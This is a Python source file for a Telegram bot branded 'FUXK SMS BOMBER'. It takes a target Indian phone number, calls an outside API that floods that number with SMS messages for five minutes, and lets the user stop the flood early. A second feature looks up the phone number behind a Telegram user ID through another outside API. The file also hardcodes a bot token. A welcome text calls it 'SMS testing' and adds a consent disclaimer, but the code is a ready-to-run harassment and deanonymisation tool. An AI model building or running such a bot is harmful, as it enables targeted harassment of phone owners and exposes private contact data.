import telebot
import requests
import time
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply

# --- CONFIGURATION ---
BOT_TOKEN = '9098247361:AAERS7fACcdnggGvgPrQdbLFboC29_4M0yc'
DEVELOPER = "@dvildealer"

# API URLs
START_API = "https://noob-bomber.noobster11001.workers.dev/?key=noobster&number="
STOP_API = "https://noob-bomber.noobster11001.workers.dev/?key=noobster&stop="
TG2NUM_API = "https://telegram2num.noobster11001.workers.dev/fast?key=noobster&q="

bot = telebot.TeleBot(BOT_TOKEN)

# Dictionary to keep track of active bombs so we can stop them
active_bombs = {}

def auto_stop_bomb(chat_id, target, msg_id):
    time.sleep(300) # Wait 5 minutes
    
    if chat_id in active_bombs:
        try:
            requests.get(f"{STOP_API}{target}")
            del active_bombs[chat_id]
            
            text = (
                f"<b>✅ BOMBING COMPLETED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"<blockquote>🎯 <b>Target:</b> <code>{target}</code>\n"
                f"⏳ <b>Status:</b> Auto-Stopped after 5 minutes</blockquote>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"<i>Powered by {DEVELOPER}</i>"
            )
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML")
        except:
            pass

# --- START COMMAND ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    text = (
        f"╔══════════════════════════════════╗\n"
        f"⚡ <b>𝐅𝐔𝐗𝐊 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑</b> ⚡\n"
        f"╚══════════════════════════════════╝\n\n"
        f"      𓆩 <b>𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘</b> 𓆪\n"
        f"             <i>{DEVELOPER}</i>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🚀 <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐅𝐔𝐗𝐊 𝐒𝐌𝐒</b>\n\n"
        f"A multifunctional Telegram utility combining SMS testing tools and Telegram ID lookup in one place.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>𝐌𝐀𝐈𝐍 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒</b>\n\n"
        f"📩 <b>01. SMS BOMBER</b>\n"
        f"├─ SMS testing functionality\n"
        f"├─ Automated SMS tools\n"
        f"└─ Simple command-based operation\n\n"
        f"🔎 <b>02. NUMBER TO TELEGRAM ID</b>\n"
        f"├─ Telegram ID lookup by phone number\n"
        f"├─ Find publicly accessible account information\n"
        f"└─ Results where available and authorized\n\n"
        f"⚙️ <b>03. SYSTEM FEATURES</b>\n"
        f"├─ Easy-to-use interface\n"
        f"├─ Fast response system\n"
        f"├─ Lightweight experience\n"
        f"└─ Convenient Telegram integration\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👑 <b>𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</b>\n\n"
        f"✦ Project Name: <b>FUXK SMS BOMBER</b>\n"
        f"✦ Developer: <i>{DEVELOPER}</i>\n"
        f"✦ Platform: <i>Telegram</i>\n"
        f"✦ Category: <i>Digital Utilities</i>\n"
        f"✦ Features: <i>SMS Tools + TG ID Lookup</i>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🛡️ <b>𝐏𝐑𝐈𝐕𝐀𝐂𝐘 & 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐈𝐁𝐈𝐋𝐈𝐓𝐘</b>\n\n"
        f"<i>Use SMS functionality only with proper authorization and consent. Number lookup is subject to Telegram privacy settings and data availability. Never use these features for harassment, spam, or privacy violations.</i>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"      𖤍 <b>𝐎𝐍𝐄 𝐁𝐎𝐓. 𝐓𝐖𝐎 𝐓𝐎𝐎𝐋𝐒.</b>\n"
        f"         ⚡ <b>𝐅𝐔𝐗𝐊 𝐒𝐌𝐒</b> ⚡\n\n"
        f"      <b>𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 {DEVELOPER}</b>\n\n"
        f"╚══════════════════════════════════╝"
    )
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💣 SMS BOMBER", callback_data="bomb_menu"))
    markup.add(InlineKeyboardButton("🔎 TG ID TO NUMBER", callback_data="tg2num_menu"))
    
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="HTML")

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id

    if call.data == "bomb_menu":
        if chat_id in active_bombs:
            return bot.answer_callback_query(call.id, "❌ You already have an active bomb running!", show_alert=True)
            
        msg = bot.send_message(chat_id, "📱 <b>Enter the target phone number</b> (10 digits, no +91):\n\nExample: <code>9876543210</code>", parse_mode="HTML")
        bot.register_next_step_handler(msg, process_target)
        
    elif call.data == "tg2num_menu":
        msg = bot.send_message(chat_id, "🔎 <b>Enter the Telegram ID</b> to lookup:\n\nExample: <code>5119247084</code>", parse_mode="HTML")
        bot.register_next_step_handler(msg, process_tg_lookup)

    elif call.data == "stop_bomb":
        if chat_id in active_bombs:
            target = active_bombs[chat_id]
            try:
                requests.get(f"{STOP_API}{target}")
            except:
                pass
            del active_bombs[chat_id]
            bot.answer_callback_query(call.id, "Bombing stopped!")
            bot.edit_message_text(
                f"<b>🛑 BOMBING STOPPED</b>\n\nTarget: <code>{target}</code>\n<i>Stopped manually.</i>",
                chat_id, call.message.message_id, parse_mode="HTML"
            )
        else:
            bot.answer_callback_query(call.id, "No active bomb running.")

def process_target(message):
    chat_id = message.chat.id
    target = message.text.strip()
    target = target.replace("+91", "").replace(" ", "").replace("-", "")
    
    if not target.isdigit() or len(target) != 10:
        return bot.reply_to(message, "❌ Invalid number. Please enter a 10-digit Indian number.")
        
    msg = bot.send_message(chat_id, f"🔄 <b>Initializing Bomber for {target}...</b>", parse_mode="HTML")
    
    try:
        res = requests.get(f"{START_API}{target}")
        active_bombs[chat_id] = target
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bomb"))
        
        text = (
            f"<b>💣 BOMBING STARTED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"<blockquote>🎯 <b>Target:</b> <code>{target}</code>\n"
            f"⚡ <b>Status:</b> Active</blockquote>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>The bomber will run in the background. Click stop to end it early.</i>"
        )
        bot.edit_message_text(text, chat_id, msg.message_id, reply_markup=markup, parse_mode="HTML")
        threading.Thread(target=auto_stop_bomb, args=(chat_id, target, msg.message_id)).start()
    except Exception as e:
        bot.edit_message_text(f"❌ <b>API Error:</b> Could not start the bomb.\n\n<code>{e}</code>", chat_id, msg.message_id, parse_mode="HTML")

def process_tg_lookup(message):
    chat_id = message.chat.id
    tg_id = message.text.strip()
    
    if not tg_id.isdigit():
        return bot.reply_to(message, "❌ Invalid Telegram ID. Please enter numbers only.")
        
    msg = bot.send_message(chat_id, f"🔄 <b>Looking up ID {tg_id}...</b>", parse_mode="HTML")
    
    try:
        res = requests.get(f"{TG2NUM_API}{tg_id}")
        data = res.json()
        
        if data.get('status') and data.get('phone'):
            phones = data['phone']
            text = f"<b>🔎 LOOKUP SUCCESSFUL</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            text += f"🆔 <b>Telegram ID:</b> <code>{data['tg_id']}</code>\n\n"
            
            for p in phones:
                text += f"<blockquote>📞 <b>Phone:</b> <code>{p['country_code']}{p['number']}</code>\n🌍 <b>Country:</b> {p.get('country', 'Unknown')} {p.get('country_flag', '')}</blockquote>\n"
                
            text += f"━━━━━━━━━━━━━━━━━━━━━\n<i>Powered by {DEVELOPER}</i>"
        else:
            text = f"❌ <b>No data found</b> for Telegram ID <code>{tg_id}</code>.\n\n<i>The user may have restricted privacy settings.</i>"
            
        bot.edit_message_text(text, chat_id, msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"❌ <b>API Error:</b> Could not fetch data.\n\n<code>{e}</code>", chat_id, msg.message_id, parse_mode="HTML")

if __name__ == '__main__':
    print("💣 FUXK SMS Bomber & Lookup Bot is running...")
    bot.infinity_polling()
